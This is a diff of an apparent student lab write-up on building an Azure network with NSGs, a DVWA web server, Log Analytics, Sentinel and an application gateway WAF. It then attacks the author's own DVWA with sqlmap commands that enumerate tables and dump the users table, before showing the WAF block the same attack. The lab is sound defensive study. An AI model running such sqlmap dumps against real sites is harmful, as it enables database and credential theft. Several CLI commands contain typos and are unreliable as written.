@@ -109,8 +109,51 @@ the WAF and DB through.
 
 ## Configuration {#configuration .western style="margin-left: 0.5in"}
 
-![](/images/gradprojimport/FA2022_CC031_ProjAzure_Gagnon_Thomas_VM_AzureMySQL_Bastion_LogAnalytics_Sentinel_AppGate_WAF_html_7ced87df.gif)
+```commandline
+az network vnet create -n SenVirtNet -g AzureSentinelProj2022 --address-prefixes 172.16.0.0/20
 
+#Creating Virtual Network
+az network vnet subnet create -g AzureSentinelProj2022 --vnet-name SenVirtNet \
+    -n AppGateBoundary --address-prefixes 172.16.1.0/24
+az network vnet subnet create -g AzureSentinelProj2022 --vnet-name SenVirtNet \
+    -n WebSrvBoundary --address-prefixes 172.16.2.0/24
+az network vnet subnet create -g AzureSentinelProj2022 --vnet-name SenVirtNet \
+    -n DatBasBoundary --address-prefixes 172.16.3.0/24
+
+#Creating Subnets for each boundary
+az network nsg create -g AzureSentinelProj2022 --name AppGateNSG
+az network nsg create -g AzureSentinelProj2022 --name WebSrvNSG
+az network nsg create -g AzureSentinelProj2022 --name DatBaseNSG
+
+#Creating the respective NSGs to control traffic flow
+az network vnet subnet update -g AzureSentinelProj2022 -n AppGateBoundary \
+        --vnet-name SenVirtNet --network-security-group AppGateNSG
+az network vnet subnet update -g AzureSentinelProj2022 -n WebSrvBoundary \
+        --vnet-name SenVirtNet --network-security-group WebSrvNSG
+az network vnet subnet update -g AzureSentinelProj2022 -n DatBasBoundary \
+        --vnet-name SenVirtNet --network-security-group DatBasNSG
+
+az network nsg rule create -g AzureSentinelProj2022 -n DatBasBoundary \
+    -n WebsrvSQLTraffic --priority 100 \
+  --source-address-prefixes 172.16.2.0/24 --source-port-ranges '*'\
+  --destination-address-prefixes 172.16.3.0/24 --destination-port-ranges 3306 --access allow
+#Attaching Traffic from the web server network to the database
+az network nsg rule create -g AzureSentinelProj2022 -n AppGateBoundary \
+    -n WebsrvSQLTraffic --priority 100 \
+  --source-address-prefixes 'MY-IP' --source-port-ranges 80 \
+  --destination-address-prefixes '*' --destination-port-ranges 80 --access allow
+# Allowing Application gateway to pass web traffic to webserver
+az network nsg rule create -g AzureSentinelProj2022 -n AppGateBoundary \
+    -n AppGateV2Rule --priority 101 \
+  --source-address-prefixes '*' --source-port-ranges '*'\
+  --destination-address-prefixes '*' --destination-port-ranges 65200-65535 --access allow
+#Adding required ports for AppGate to communicate with Azure Services
+az network nsg rule create -g AzureSentinelProj2022 -n AppGateBoundary \
+    -n WebsrvSQLTraffic --priority 100 \
+  --source-address-prefixes 172.16.1.0/24 --source-port-ranges 80 \
+  --destination-address-prefixes 172.16.2.0/24 --destination-port-ranges 80 --access allow
+#Allowing http traffic from the application gate to the webserver
+```
 
 ## Virtual Network {#virtual-network .western style="margin-left: 0.5in"}
 
@@ -141,7 +184,14 @@ DatBasBoundary - 172.16.3.0/24
 
 I used an Ubuntu 20.04 server to hold the LAMP stack. This web server will exist in the WebSrvBoundary, and access will be enabled for the webserver to communicate with the database NSG and the Application gateway NSG. This web application is relatively small and does not need many resources to run a webpage.
 
-![](/images/gradprojimport/FA2022_CC031_ProjAzure_Gagnon_Thomas_VM_AzureMySQL_Bastion_LogAnalytics_Sentinel_AppGate_WAF_html_a134a5cf.gif)
+```commandline
+az vm create --name SenVirtWebSrv01 -g AzureSentinelProj2022 \
+--image Canonical:0001-com-ubuntu-server-focal:20_04-lts:least --size Standard_B2s \
+--vnet-name SenVirtNet --Subnet WebSrvBoundary --nsg WebSrvNSG \
+--public-ip-address "" --private-ip-address 172.16.2.5 \
+--authentication-type ssh --admin-username senvirtadmin --generate-ssh-keys
+```
+
 
 After running this command, we can see that SenVirtWebSrv01 has been created and is running.
 
@@ -149,7 +199,14 @@ After running this command, we can see that SenVirtWebSrv01 has been created and
 
 Once the webserver is active, I use the following CLI command to install the LAMP stack.
 
-![](/images/gradprojimport/FA2022_CC031_ProjAzure_Gagnon_Thomas_VM_AzureMySQL_Bastion_LogAnalytics_Sentinel_AppGate_WAF_html_5054b273.gif)
+```commandline
+az vm run-command invoke \
+  -g AzureSentinalProj2022
+  -n SenVirtWebSrv01 \
+  --command-id RunShellScript \
+  --scripts "sudo apt-get update && sudo apt-get install -y lamp-server"
+# This script will run the install packages for a LAMP stack
+```
 
 Now that the LAMP stack has been installed. Using the bastion, I can verify that the Stack has been installed and that the web server is running as intended.
 
@@ -378,7 +435,9 @@ Analytics platform; Azure Sentinel can not be configured before Log
 Analytics has been enabled. Log Analytics can be configured with the
 following command.
 
-![](/images/gradprojimport/FA2022_CC031_ProjAzure_Gagnon_Thomas_VM_AzureMySQL_Bastion_LogAnalytics_Sentinel_AppGate_WAF_html_3895b9d4.gif)
+```commandline
+az monitor log-analytics workspace create -g AzureSentinelProj2022 -n SenNetLAW
+```
 
 Log Analytics has now been created
 
@@ -602,7 +661,7 @@ webserver.
 
 # DVWA Installation {#dvwa-installation .western}
 
-![](/images/gradprojimport/FA2022_CC031_ProjAzure_Gagnon_Thomas_VM_AzureMySQL_Bastion_LogAnalytics_Sentinel_AppGate_WAF_html_9fcb78e6.gif)
+
 
 DVWA is a web application built for web application penetration testing.
 It is easy to configure and available on GitHub. I choose this web
@@ -611,12 +670,45 @@ exploitability. To install DVWA, the server needs a LAMP stack that was
 installed previously. Using the bastion in the network, I connect to the
 VM, and I can begin the installation
 
-[]{#_MON_1725644913} I will disable MySQL.service because it is not
+I will disable MySQL.service because it is not
 needed on this server, pull a copy of DVWA, and set the default website
 to DVWA in Apache.
 
-![](/images/gradprojimport/FA2022_CC031_ProjAzure_Gagnon_Thomas_VM_AzureMySQL_Bastion_LogAnalytics_Sentinel_AppGate_WAF_html_efc37cfc.gif)
+```commandline
+sudo systemctl stop mysql.service | sudo systemctl disable mysql.service
 
+git clone https://github.com/digininja/DVWA.git
+
+echo '<?php phpinfo();?>' | sudo tee -a /var/www/html/phpinfo.php > /dev/null
+
+cd DVWA
+cp config/config.inc.php.dist config/config.inc.php
+cd
+sudo mv DVWA /var/www/html
+cd /var/www/html/DVWA
+
+sudo nano /etc/apache2/site-available/000-default.conf
+
+    ServerAdmin webmaster@localhost
+    DocumentRoot /var/www/html/DVWA
+
+sudo nano ./config/config.inc.php
+
+$_DVWA['DB_server'] = 'senvirtdb.mysql.database.azure.com';
+$_DVWA['DB_port'] = '3306';
+$_DVWA['DB_user'] = 'dvwa';
+$_DVWA['DB_password'] = 'p@ssw0rd';
+$_DVWA['DB_database'] = 'dvwa';
+
+# Default security level
+# Default value for the security level with each session.
+# The default is 'impossible'. You may wish to set this to either 'low','medium','high'
+$_DVWA['default_security_level'] = 'medium';
+
+
+sudo systemctl restart apache2
+systemctl status apache2
+```
 Now that the configuration has been completed, we can load the webpage
 
 ![](/images/gradprojimport/FA2022_CC031_ProjAzure_Gagnon_Thomas_VM_AzureMySQL_Bastion_LogAnalytics_Sentinel_AppGate_WAF_html_34b5fee9.png)
@@ -658,26 +750,40 @@ webserver, we can build our SQLMap command and begin enumerating the
 database by running the following command and setting the wizard option
 to allow SQLMap to automate the attack.
 
-![](/images/gradprojimport/FA2022_CC031_ProjAzure_Gagnon_Thomas_VM_AzureMySQL_Bastion_LogAnalytics_Sentinel_AppGate_WAF_html_60130913.gif)
+```commandline
+sqlmap -u "http://20.163.243.165/vulnerabilities/sqli/" --proxy=http://127.0.0.1:8080
+--cookie="PHPSESSID=ueufmufdimuqm9l72lf6on1lkg;security=medium"
+--data="id=1&Submnit=Submit""
+--wizard
+```
 
 
 ![](/images/gradprojimport/FA2022_CC031_ProjAzure_Gagnon_Thomas_VM_AzureMySQL_Bastion_LogAnalytics_Sentinel_AppGate_WAF_html_ebc1acf.jpg)
 
 
 ![](/images/gradprojimport/FA2022_CC031_ProjAzure_Gagnon_Thomas_VM_AzureMySQL_Bastion_LogAnalytics_Sentinel_AppGate_WAF_html_60ec0488.jpg)
-
-[]{#_MON_1725623257} Now that SQLMap has found a vulnerability, we can
+ 
+Now that SQLMap has found a vulnerability, we can
 see the database is DVWA and scan for tables by running the following.
 
-![](/images/gradprojimport/FA2022_CC031_ProjAzure_Gagnon_Thomas_VM_AzureMySQL_Bastion_LogAnalytics_Sentinel_AppGate_WAF_html_9ce49cb2.gif)
-
+```commandline
+sqlmap -u "http://20.163.243.165/vulnerabilities/sqli/" --proxy=http://127.0.0.1:8080
+--cookie="PHPSESSID=ueufmufdimuqm9l72lf6on1lkg;security=medium"
+--data="id=1&Submnit=Submit""
+--wizard -D dvwa --tables
+```
 ![](/images/gradprojimport/FA2022_CC031_ProjAzure_Gagnon_Thomas_VM_AzureMySQL_Bastion_LogAnalytics_Sentinel_AppGate_WAF_html_5ea5af31.jpg)
 
 We can see that the DVWA database contains the
 table guestbook and users. We want to find users and passwords, so
 we\'ll run the same command with the table users and search for columns
 
-![](/images/gradprojimport/FA2022_CC031_ProjAzure_Gagnon_Thomas_VM_AzureMySQL_Bastion_LogAnalytics_Sentinel_AppGate_WAF_html_96f4955c.gif)
+```commandline
+sqlmap -u "http://20.163.243.165/vulnerabilities/sqli/" --proxy=http://127.0.0.1:8080
+--cookie="PHPSESSID=ueufmufdimuqm9l72lf6on1lkg;security=medium"
+--data="id=1&Submnit=Submit""
+--wizard -D dvwa -T users --columns
+```
 
 ![](/images/gradprojimport/FA2022_CC031_ProjAzure_Gagnon_Thomas_VM_AzureMySQL_Bastion_LogAnalytics_Sentinel_AppGate_WAF_html_117904ff.jpg)
 
@@ -685,7 +791,12 @@ We can see that the table users contains the
 passwords and users. So we\'ll want to dump the users\' table and crack
 the passwords by running the following command
 
-![](/images/gradprojimport/FA2022_CC031_ProjAzure_Gagnon_Thomas_VM_AzureMySQL_Bastion_LogAnalytics_Sentinel_AppGate_WAF_html_31561a58.gif)
+```commandline
+sqlmap -u "http://20.163.243.165/vulnerabilities/sqli/" --proxy=http://127.0.0.1:8080
+--cookie="PHPSESSID=ueufmufdimuqm9l72lf6on1lkg;security=medium"
+--data="id=1&Submnit=Submit""
+--wizard -D dvwa -T users -dump
+```
 
 ![](/images/gradprojimport/FA2022_CC031_ProjAzure_Gagnon_Thomas_VM_AzureMySQL_Bastion_LogAnalytics_Sentinel_AppGate_WAF_html_3a081753.jpg)
 
@@ -778,8 +889,12 @@ We need to change the WAF policy by clicking change to prevention in the WAF pol
 
 Now that we can see the WAF is in prevention mode and we will rerun the attack
 
-![](/images/gradprojimport/FA2022_CC031_ProjAzure_Gagnon_Thomas_VM_AzureMySQL_Bastion_LogAnalytics_Sentinel_AppGate_WAF_html_ec960e93.gif)
-
+```commandline
+sqlmap -u "http://20.163.243.165/vulnerabilities/sqli/" --proxy=http://127.0.0.1:8080
+--cookie="PHPSESSID=ueufmufdimuqm9l72lf6on1lkg;security=medium"
+--data="id=1&Submnit=Submit""
+--wizard 
+```
 And as we can see, the attack fails immediately
 
 ![](/images/gradprojimport/FA2022_CC031_ProjAzure_Gagnon_Thomas_VM_AzureMySQL_Bastion_LogAnalytics_Sentinel_AppGate_WAF_html_972d1caf.jpg)
